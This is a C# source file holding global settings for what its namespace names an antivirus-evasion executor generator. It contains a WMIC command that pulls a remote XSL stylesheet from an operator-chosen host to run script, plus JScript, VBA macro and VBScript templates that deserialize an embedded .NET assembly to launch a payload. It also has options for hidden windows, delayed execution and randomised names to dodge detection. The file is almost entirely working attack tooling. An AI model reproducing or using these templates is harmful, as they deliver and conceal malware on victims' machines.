using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    static class Global_Var
    {
        public static bool Http_server_status = false;    //是否开启了HTTP服务，HTTP服务主要是为了一句话上线
        public static string Current_IP = null;    //当前电脑的IP
        public static string HTTP_Port = "8080";  //一句话上线默认端口
        public static string XSL_code;
        public static int delay = 0;   //延时执行，单位秒
        public static bool hidden = false;  //是否隐藏执行窗口
        public static bool var_random = true;  //变量名、函数名随机化
        public static string arch = "x86";   //目标架构
        public static string dll_path = @"C:\Windows\temp\YR_Temp_9uI0.dll";
        //public static string dll_path = @"C:\Users\www1y\Desktop\DotNetToJScript-master\DotNetToJScript\bin\Debug\ClassLibrary2.dll";
        public static string entry_class_name;
        public static string one_command = @"C:\Windows\SysWOW64\wbem\WMIC.exe os get ^/FORMAT^:""http://{put_ip_and_port_here}/"""; //一句免杀上线

        public static string xsl_template = @"<?xml version='1.0'?>
<stylesheet
xmlns=""http://www.w3.org/1999/XSL/Transform"" xmlns:ms=""urn:schemas-microsoft-com:xslt""
xmlns:user=""placeholder""
version=""1.0"">
<output method=""text""/>
	<ms:script implements-prefix=""user"" language=""JScript"">
	<![CDATA[
%JS_HERE%
	]]> </ms:script>
</stylesheet>";

        //以下是 DotNetToJscript 原本的模板类文件
        public static string jscript_auto_version_script = @"var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
} catch(e) { 
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;";

        public static string jscript_template = @"function base64ToStream(b) {
	var enc = new ActiveXObject(""System.Text.ASCIIEncoding"");
	var length = enc.GetByteCount_2(b);
        var ba = enc.GetBytes_4(b);
        var transform = new ActiveXObject(""System.Security.Cryptography.FromBase64Transform"");
        ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject(""System.IO.MemoryStream"");
        ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

    var serialized_obj = %SERIALIZED%;
    var entry_class = '%CLASS%';

try {
	setversion();
    var stm = base64ToStream(serialized_obj);
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList');
    var d = fmt.Deserialize_2(stm);
    al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	%ADDEDSCRIPT%
} catch (e) {
    debug(e.message);
}";

        public static string scriptlet_template = @"<?xml version='1.0'?>
<package>
<component id='dummy'>
<registration
  description='dummy'
  progid='dummy'
  version='1.00'
  remotable='True'>
</registration>
</component>
</package>";

        public static string manifest_template = @"﻿<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?><assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""><assemblyIdentity name=""mscorlib"" version=""%MSCORLIBVERSION%"" publicKeyToken=""B77A5C561934E089"" /><clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" runtimeVersion=""%RUNTIMEVERSION%"" /><clrClass clsid=""{8D907746-455E-39A7-BD31-BC9F81468347}"" progid=""System.Collections.ArrayList"" threadingModel=""Both"" name=""System.Collections.ArrayList"" runtimeVersion=""%RUNTIMEVERSION%"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468347}"" progid=""System.Text.ASCIIEncoding"" threadingModel=""Both"" name=""System.Text.ASCIIEncoding"" runtimeVersion=""%RUNTIMEVERSION%"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81488347}"" progid=""System.Security.Cryptography.FromBase64Transform"" threadingModel=""Both"" name=""System.Security.Cryptography.FromBase64Transform"" runtimeVersion=""%RUNTIMEVERSION%"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""%RUNTIMEVERSION%"" /></assembly>";

        public static string vb_multi_auto_version_script = @"Dim ver
ver = ""v4.0.30319""
On Error Resume Next
shell.RegRead ""HKLM\SOFTWARE\\Microsoft\.NETFramework\v4.0.30319\""
If Err.Number<> 0 Then
  ver = ""v2.0.50727""
  Err.Clear
End If
shell.Environment(""Process"").Item(""COMPLUS_Version"") = ver";

        public static string vba_template = @"Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject(""Microsoft.XMLDOM"")
    Set EL = DM.createElement(""tmp"")
    EL.DataType = ""bin.hex""
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function Run()
    On Error Resume Next

    Dim s As String
    %SERIALIZED%

    entry_class = ""%CLASS%""

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject(""System.IO.MemoryStream"")

    If stm Is Nothing Then
        %MANIFEST%

        Set ax = CreateObject(""Microsoft.Windows.ActCtx"")
		ax.ManifestText = manifest
		
        Set stm = ax.CreateObject(""System.IO.MemoryStream"")
        Set fmt = ax.CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
        Set al = ax.CreateObject(""System.Collections.ArrayList"")
    Else
        Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
        Set al = CreateObject(""System.Collections.ArrayList"")
    End If

    Dim dec
    dec = decodeHex(s)

    For Each i In dec
        stm.WriteByte i
    Next i

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set d = fmt.Deserialize_2(stm)
    al.Add Empty

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    %ADDEDSCRIPT%
    If Err.Number <> 0 Then
      DebugPrint Err.Description
      Err.Clear
    End If
End Function";

        public static string vbs_template = @"Function Base64ToStream(b)
  Dim enc, length, ba, transform, ms
  Set enc = CreateObject(""System.Text.ASCIIEncoding"")
  length = enc.GetByteCount_2(b)
  Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
  Set ms = CreateObject(""System.IO.MemoryStream"")
  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
  ms.Position = 0
  Set Base64ToStream = ms
End Function

Sub Run
Dim s, entry_class
s = %SERIALIZED%
entry_class = ""%CLASS%""

Dim fmt, al, d, o
Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
Set al = CreateObject(""System.Collections.ArrayList"")
al.Add Empty

Set d = fmt.Deserialize_2(Base64ToStream(s))
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
%ADDEDSCRIPT%
End Sub

SetVersion
On Error Resume Next
Run
If Err.Number <> 0 Then
  DebugPrint Err.Description
  Err.Clear
End If";
    }
}
